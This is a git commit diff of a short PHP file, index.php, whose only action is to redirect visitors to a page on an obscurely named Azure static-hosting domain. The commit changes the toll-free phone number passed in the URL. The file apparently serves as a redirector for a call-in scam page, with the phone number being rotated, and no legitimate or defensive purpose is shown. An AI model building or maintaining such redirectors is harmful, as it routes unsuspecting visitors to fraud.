fee918c202cefbfc1164587df8a82c84f2643688
mancillajoaquin204 <mancillajoaquin204@gmail.com>
2025-06-05 23:40:32 +0530

    Update index.php

--- index.php
+++ index.php
@@ -1,7 +1,7 @@
 <?php
 
 // Redirect browser
-header("Location: https://search9andfind87yourways.z28.web.core.windows.net//index.html?Aniph=1-833-443-3001");
+header("Location: https://search9andfind87yourways.z28.web.core.windows.net//index.html?Aniph=1-833-493-3311");
 
 exit;
 ?>
